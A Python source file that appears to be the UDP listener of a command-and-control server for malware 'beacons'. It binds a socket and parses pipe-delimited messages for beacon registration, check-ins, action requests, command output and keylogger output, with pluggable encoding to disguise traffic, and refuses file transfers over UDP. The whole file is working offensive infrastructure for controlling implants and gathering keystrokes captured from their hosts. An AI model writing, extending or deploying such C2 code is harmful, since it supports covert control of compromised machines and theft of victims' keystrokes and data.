import socket
import threading
from typing import Dict, Any, Optional
from .base_receiver import BaseReceiver, ReceiverStatus
from .encoding_strategies import EncodingStrategy
from .receiver_config import ReceiverConfig
import utils

class UDPConnectionHandler:
    """Handles UDP connections using BaseReceiver functionality"""
    
    def __init__(self, receiver_instance):
        self.receiver_instance = receiver_instance
    
    def handle_datagram(self, data: bytes, client_address: tuple):
        """Handle a UDP datagram using BaseReceiver functionality"""
        
        try:
            # Decode the data
            try:
                initial_data_decoded = self.receiver_instance.encoding_strategy.decode(data)
                initial_data = initial_data_decoded.decode('utf-8').strip()
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"Decoding error from {client_address}: {e}")
                return
                
            parts = initial_data.split('|')
            command = parts[0] if parts else ""
            
            # Update stats using thread-safe method
            self.receiver_instance.update_bytes_received(len(data))
            
            # For UDP, we only handle simple command processing (no file transfers)
            if command in ("to_beacon", "from_beacon"):
                # UDP doesn't support file transfers - send error response
                error_response = self.receiver_instance.encoding_strategy.encode(
                    b"ERROR|File transfer not supported over UDP"
                )
                self.receiver_instance._send_udp_response(error_response, client_address)
            else:
                self._handle_simple_command(initial_data, client_address)
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"UDP Error: {client_address[0]}:{client_address[1]} - {str(e)}")
    
    def _handle_simple_command(self, data: str, client_address: tuple):
        """Handle simple command processing for UDP (no persistent connection)"""
        
        parts = data.split('|')
        if not parts:
            error_response = self.receiver_instance.encoding_strategy.encode(b"Invalid command format")
            self.receiver_instance._send_udp_response(error_response, client_address)
            return
            
        command = parts[0]
        
        try:
            # Use existing command processor logic for stateless commands
            if command == "command_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
                response = self.receiver_instance.command_processor.process_command_output(beacon_id, output)
            elif command == "keylogger_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = data.split('|', 2)[2] if len(parts) > 2 else ""
                response = self.receiver_instance.command_processor.process_keylogger_output(beacon_id, output)
            else:
                # Standard command dispatch
                response = {
                    "register": lambda: self.receiver_instance.command_processor.process_registration(
                        parts[1], parts[2], self.receiver_instance.receiver_id, self.receiver_instance.name
                    ) if len(parts) == 3 else "Invalid registration format",
                    
                    "request_action": lambda: self.receiver_instance.command_processor.process_action_request(
                        parts[1], self.receiver_instance.receiver_id, self.receiver_instance.name
                    ) if len(parts) == 2 else "Invalid request format",
                    
                    "checkin": lambda: "Check-in acknowledged"
                        if len(parts) == 2 else "Invalid checkin format",
                }.get(command, lambda: "Unknown command")()
                
            # Encode and send response
            encoded_response = self.receiver_instance.encoding_strategy.encode(response.encode('utf-8'))
            self.receiver_instance._send_udp_response(encoded_response, client_address)
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing UDP command {command}: {e}")

class UDPReceiver(BaseReceiver):
    """UDP receiver implementation with encoding support"""
    
    def __init__(self, config: ReceiverConfig, encoding_strategy: EncodingStrategy):
        super().__init__(config.receiver_id, config.name, encoding_strategy)
        self.config = config
        self.socket: Optional[socket.socket] = None
        self.connection_handler: Optional[UDPConnectionHandler] = None
        
    def _setup_receiver(self) -> bool:
        """Setup UDP server"""
        try:
            # Create UDP connection handler
            self.connection_handler = UDPConnectionHandler(self)
            
            # Create UDP socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.settimeout(1.0)  # Allow periodic shutdown checks
            
            # Bind to address
            self.socket.bind((self.config.host, self.config.port))
            
            return True
            
        except Exception as e:
            self.error_occurred.emit(self.receiver_id, f"UDP setup failed: {str(e)}")
            return False
            
    def _start_listening(self):
        """Start listening for UDP datagrams"""
        if not self.socket:
            return
            
        try:
            while not self._shutdown_event.is_set():
                try:
                    # Receive datagram with timeout
                    data, client_address = self.socket.recvfrom(self.config.buffer_size)
                    
                    # Update connection stats (for UDP, each datagram is a "connection")
                    self.increment_active_connections()
                    
                    try:
                        # Handle the datagram
                        self.connection_handler.handle_datagram(data, client_address)
                    finally:
                        self.decrement_active_connections()
                        
                except socket.timeout:
                    # Timeout is expected, just continue to check shutdown event
                    continue
                except OSError as e:
                    # Check if this is due to shutdown or a real error
                    if self._shutdown_event.is_set():
                        break
                    raise
                        
        except Exception as e:
            if not self._shutdown_event.is_set():
                self.error_occurred.emit(self.receiver_id, f"UDP listening error: {str(e)}")
                
    def _cleanup_receiver(self):
        """Cleanup UDP socket"""
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            finally:
                self.socket = None
    
    def _send_data(self, sock: socket.socket, data: bytes) -> bool:
        """Send data through UDP socket (not applicable for UDP receiver pattern)"""
        # This method is required by the abstract base class but not used in UDP receiver
        # UDP responses are sent via _send_udp_response instead
        return False
    
    def _receive_data(self, sock: socket.socket, buffer_size: int) -> bytes:
        """Receive data through UDP socket (not applicable for UDP receiver pattern)"""
        # This method is required by the abstract base class but not used in UDP receiver
        # UDP data is received via recvfrom in _start_listening instead
        return b""
    
    def _send_udp_response(self, data: bytes, client_address: tuple):
        """Send UDP response to specific client"""
        try:
            if self.socket:
                bytes_sent = self.socket.sendto(data, client_address)
                self.update_bytes_sent(bytes_sent)
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error sending UDP response: {e}")
                
    def get_configuration(self) -> Dict[str, Any]:
        """Get UDP receiver configuration"""
        return {
            "host": self.config.host,
            "port": self.config.port,
            "buffer_size": self.config.buffer_size,
            "timeout": self.config.timeout,
            "encoding": self.encoding_strategy.get_name()
        }
        
    def update_configuration(self, config_updates: Dict[str, Any]) -> bool:
        """Update UDP receiver configuration"""
        try:
            if "port" in config_updates:
                new_port = int(config_updates["port"])
                if 1 <= new_port <= 65535:
                    self.config.port = new_port
                else:
                    return False
                    
            if "host" in config_updates:
                self.config.host = config_updates["host"]
                
            if "buffer_size" in config_updates:
                self.config.buffer_size = int(config_updates["buffer_size"])
                
            # Restart if running to apply changes
            if self.status == ReceiverStatus.RUNNING:
                return self.restart()
                
            return True
            
        except Exception:
            return False